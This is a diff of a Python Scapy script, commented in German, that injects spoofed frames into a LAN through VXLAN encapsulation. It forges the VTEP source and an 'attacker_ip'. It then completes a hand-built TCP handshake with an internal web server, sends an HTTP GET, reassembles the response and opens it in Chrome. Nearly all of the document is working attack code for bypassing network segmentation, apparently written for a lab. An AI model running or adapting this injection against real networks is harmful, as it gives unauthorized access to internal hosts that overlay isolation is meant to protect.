@@ -15,10 +15,11 @@ import sys
 import threading
 from threading import Thread
 import time
+import webbrowser
+import os
 
 
 ### Variabeln definieren
-
 vtep_dst = "192.168.10.149"
 vtep_src = "172.20.10.254" #Hier muss eine IP aus meinem Subnetz stehen, sonst verwirft der erste Hop das Paket!
 vxlanport = 4789
@@ -27,19 +28,17 @@ mac_src = "be:fb:ef:be:fb:ef"
 mac_dst = "ea:e4:59:b5:42:03" #"ff:ff:ff:ff:ff:ff"
 attacker_ip = "172.20.10.10"
 http_port = int(sys.argv[2])
-dest = sys.argv[1]
+destination_ip = sys.argv[1]
 s_port = random.randint(20000,65500)
 
-# TCP-Flags definieren
-FIN = 0x01
-SYN = 0x02
-RST = 0x04
-PSH = 0x08
-ACK = 0x10
-URG = 0x20
-ECE = 0x40
-CWR = 0x80
+### Variablen einfuehren
+CONNECTION = {"connected": False}
+CONNECTION_FINISHED = False
+http_content = ""
+threads = []
 
+### TCP-Flags definieren
+Flags = {"FIN": 0x01,"SYN": 0x02,"RST": 0x04,"PSH": 0x08,"ACK": 0x10,"URG": 0x20,"ECE": 0x40,"CWR": 0x80}
 
 ### Check if debug is enabled
 if len(sys.argv) > 3:
@@ -47,119 +46,134 @@ if len(sys.argv) > 3:
 else:
     debug = 0
 
-
 ### VXLAN Paket: Hierueber werden Ethernet Frames ins LAN eingefuert
 VXLAN = IP(src=vtep_src,dst=vtep_dst)/UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vx_vnid,flags="Instance")/Ether(dst=mac_dst,src=mac_src)
+### getStr ist der String im HTTP Request
+getStr = 'GET / HTTP/1.1\r\nHost:' + destination_ip + '\r\nAccept-Encoding: 8bit\r\n\r\n'
 
-### syn_ack_do ist die Funktion, die beim sniffen des SYN/ACK Pakets ausgefuehrt wird
-# Fuer das folgenden ACK Paket sind folende Parameter wichtig: Dst_Port, ACK#, SEQ#
-def syn_ack_do(packet):
-    #print(packet.summary())
-    #print(packet[TCP].dport)
-    global syn_ack_dport
-    syn_ack_dport = packet[TCP].dport
-    global syn_ack_ack
-    syn_ack_ack = packet[TCP].ack
-    global syn_ack_seq
-    syn_ack_seq = packet[TCP].seq
-    if debug:
-        print("############## SYN/ACK packet received ##############")
-        print("dport = " + str(syn_ack_dport))
-        print("ACK# = " + str(syn_ack_ack))
-        print("SEQ# = " + str(syn_ack_seq))
-        print("")
+
+
+def sniff_all_packets():
+    sniff(session=TCPSession, filter = "tcp src port " + str(http_port), prn=packet_received, store=False, stop_filter= lambda x: CONNECTION_FINISHED)
     return
 
-#$$$$$ SEND SYN
-syn = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(sport=s_port, dport=http_port, flags='S')
+def packet_received(packet):
+    payload_length = len(packet[TCP].payload)
+    flags = packet.getlayer(TCP).flags
+    in_seq = packet[TCP].seq
+    in_ack = packet[TCP].ack
+    dst_port = packet.getlayer(TCP).dport
+    ack_nr = in_seq + payload_length + 1
+    seq_nr = in_ack
+
+    ### starte den connection manager Thread
+    global threads
+    connection_management = threading.Thread(target=TCP_connection_manager, args=(packet, payload_length, flags, in_seq, in_ack, dst_port))
+    threads.append(connection_management)
+    connection_management.start()
+    
+    ### Greife HTTP header und Payload ab
+    if packet.haslayer(HTTPResponse) is True:
+        global http_status
+        ### http status ist die Response Status Nachricht. zB HTTP1.1/200/OK
+        http_status = str(packet.getlayer(HTTPResponse).Http_Version) + " " + str(packet.getlayer(HTTPResponse).Status_Code) + " " + str(packet.getlayer(HTTPResponse).Reason_Phrase) 
+    if packet.haslayer(Raw) is True:
+        global http_content
+        ### http content sind header und body und wird ggf aus mehreren Paketen zusammengesetzt. Nur die Layer Raw besitzt Teile von HTTP Content
+        http_content += str(packet.getlayer(Raw).load)
+
+def TCP_connection_manager(packet, payload_length, flags, in_seq, in_ack, dst_port):
+    if debug:
+        indent = "\t"
+        if len(str(packet.getlayer(IP).src)) < 10 :
+            indent = "\t\t"  
+        print("### <-- " + str(flags) + "\treceived from\t" + str(packet.getlayer(IP).src) + ":" + str(packet.getlayer(TCP).sport) + indent + "< ACK#: " + str(in_ack) + " | SEQ#: " + str(in_seq) + " >")
+    
+    global CONNECTION
+    global CONNECTION_FINISHED
+    #### ACK# = SEQ# + Payload Laenge + 1
+    #### SEQ# = ACK#
+    ack_nr = in_seq + payload_length + 1
+    seq_nr = in_ack
+
+    ### SYN/ACK oder Payload_Length > 0 received
+    if payload_length > 0 or (flags & (Flags["SYN"] ^ Flags["ACK"])) == 18:
+        send_flags = 'A'
+        if debug:
+            ### --> A	sent to		VX: 192.168.10.149 VNID: 1 // 10.0.0.10:80   < ACK#: 3233855856 | SEQ#: 1 >
+            print("### --> A\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< ACK#: " + str(ack_nr) + " | SEQ#: " + str(seq_nr) + " >")
+        send_tcp(dst_port, seq_nr, ack_nr, send_flags)
+
+    ### SYN/ACK received --> Connection = True
+        if (flags & (Flags["SYN"] ^ Flags["ACK"])) == 18:
+           CONNECTION = { "connected": True , "dst_port": dst_port, "seq_nr": seq_nr, "ack_nr": ack_nr}
+
+    ### FIN received --> Connection is finished
+    if flags & Flags["FIN"]:
+        send_flags = 'F''A'
+        if debug:
+            print("### --> FA\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< ACK#: " + str(ack_nr) + " | SEQ#: " + str(seq_nr) + " >")
+        send_tcp(dst_port, seq_nr, ack_nr, send_flags)
+        CONNECTION_FINISHED = True
+    return
+
+def send_tcp(src_port, seqnr, acknr, tcp_flags):
+    ack = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags=tcp_flags)
+    out_ack = send(ack, verbose=0)
+    return
+
+def send_request():
+    while CONNECTION["connected"] is not True:
+        time.sleep(0.01)
+    syn_ack_received_send_http_req(CONNECTION["dst_port"], CONNECTION["seq_nr"], CONNECTION["ack_nr"])
+
+def syn_ack_received_send_http_req(src_port, seqnr, acknr):
+    http_request = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(dport=http_port, sport=src_port,seq=seqnr, ack=acknr, flags='P''A') / getStr
+    send(http_request, verbose=0)
+    if debug:
+        print("### --> PA\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< ACK#: " + str(acknr) + " | SEQ#: " + str(seqnr) + " > (HTTP Request)")
+
+def fin_function():
+    ### Wait until FIN packet is received
+    while CONNECTION_FINISHED is not True:
+        time.sleep(0.2)
+    ### Connection is Finished --> FIN Packet Received
+    print ("\r\n\r\n")
+    print(http_status)
+    print("")
+    print(http_content)
+
+    ### Oeffne Google Chrome mit der Website
+    http_body = http_content.partition("\r\n\r\n")[2]
+    f = open("website.html", "w")
+    f.write(http_body)
+    f.close()
+    new = 2
+    url = "/home/ben/http_request/website.html"
+    os.system('sudo -u ben google-chrome-stable /home/ben/http_request/website.html')
+    return
+
+
+########################
+### Erstelle die Threads
+SNIFFER = threading.Thread(target=sniff_all_packets)
+Fin_Thread = threading.Thread(target=fin_function)
+send_request_thread = threading.Thread(target=send_request)
+### starte die Threads
+send_request_thread.start()
+Fin_Thread.start()
+SNIFFER.start()
+### warte bis threads laufen
+time.sleep(1)
+#######################
+
+
+
+
+#### SEND SYN
+syn = VXLAN / IP(src=attacker_ip,dst=destination_ip) / TCP(sport=s_port, dport=http_port, flags='S')
 send(syn, verbose=0)
 if debug:
-        print("############## SYN packet sent #####################")
-        print("dport von SYN = " + str(http_port))
-        print("Source IP Address = " + str(attacker_ip))
-        print("Destination IP Address = " + str(dest))
-        print("")
-
-#$$$$$ GET SYNACK : TCP flags SYN and ACK are set
-sniff(lfilter = lambda x: x.haslayer(TCP) and x[TCP].flags & ACK and x[TCP].flags & SYN, prn=syn_ack_do, count = 1)
-
-#$$$$$ SEND ACK
-ack = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='A')
-out_ack = send(ack, verbose=0)
-if debug:
-        print("############## ACK packet sent #####################")
-        print("srcport = " + str(syn_ack_dport)) 
-        print("ACK# = " + str(syn_ack_seq + 1))
-        print("SEQ# = " + str(syn_ack_ack))
-        print("")
-
-
-### Thread Klasse initiieren fuer den Sniffer von HTTPResponse
-# bei run() wird  sniff_http_response_thread() ausgefuehrt
-class myThread (threading.Thread):
-   def __init__(self):
-      threading.Thread.__init__(self)
-   def run(self):
-      sniff_http_response_thread()
-
-
-### Sniff Funktion fuer sniff_http_response_thread
-def get_http_packet(packet):
-        if debug:
-            print("############## HTTP Response received ###################")
-            print("TCP ACK =  " + str(packet.getlayer(TCP).ack))
-            print("TCP SEQ =  " + str(packet.getlayer(TCP).seq))
-            print("HTTP Layer vorhanden? : " + str(packet.haslayer(HTTPResponse)))
-            print("Source IP =  " + str(packet.getlayer(IP).src))
-            print("")
-            
-        if packet.haslayer(HTTPResponse) is True:
-            print("############## Header ###################")
-            print("")
-            header_str = str(packet.getlayer(HTTPResponse)[0:len(packet.getlayer(HTTPResponse))])
-            left_text = header_str.partition("<!")[0]
-            print(left_text)
-            print""
-            print("############## Body ###################")            
-            http_response_body = str(packet.getlayer(Raw).load)
-            print http_response_body
-        else:
-            print("Keine HTTP Layer vorhanden")
-        print("")
-        return
-
-### Sniff Funktion um HTTPResponse zu finden
-# Sie filtert auf TCP Pakete mit der ACK Nummer 58. Der Request hast eine Laenge von 57. Die Ack Nummer ist Length + 1
-def sniff_http_response_thread():
-    sniff(filter = "tcp port " + str(http_port) + " and tcp[11] == 58 and tcp[13] == 24 and greater 100", prn=get_http_packet, count = 1)  # + " and tcp[tcpflags] & tcp-ack == 58"
-    return
-
-# Sniffer als Thread initiieren und starten, damit waehrend der Request losgeschickt wird
-# auch sehr schnelle Responses eingefangen werden koennen
-sniffer = myThread()
-sniffer.start()
-time.sleep(1) #Sniffer braucht ein wenig Zeit zum wach werden
-
-### HTTP GET Paket 
-# Hier wurd durch ein Argument des Skripts die Destination Address mitgtgeben. Accept-Encoding ist 8bit, damit nicht codiert wird.
-getStr = 'GET / HTTP/1.1\r\nHost:' + dest + '\r\nAccept-Encoding: 8bit\r\n\r\n'
-
-#$$$$$ SEND HTTP Request
-http_request = VXLAN / IP(src=attacker_ip,dst=dest) / TCP(dport=http_port, sport=syn_ack_dport,seq=syn_ack_ack, ack=syn_ack_seq + 1, flags='P''A') / getStr
-send(http_request, verbose=0)
-if debug:
-        print("############## HTTP Request sent #####################")
-        print("srcport = " + str(syn_ack_dport)) 
-        print("ACK# = " + str(syn_ack_seq + 1))
-        print("SEQ# = " + str(syn_ack_ack))
-        print("")
-
-
-
-
-
-
-
-
+       print("### --> S\tsent to\t\t" + destination_ip + ":" + str(http_port) + "\t\t< SEQ#: 0 >")
 
 
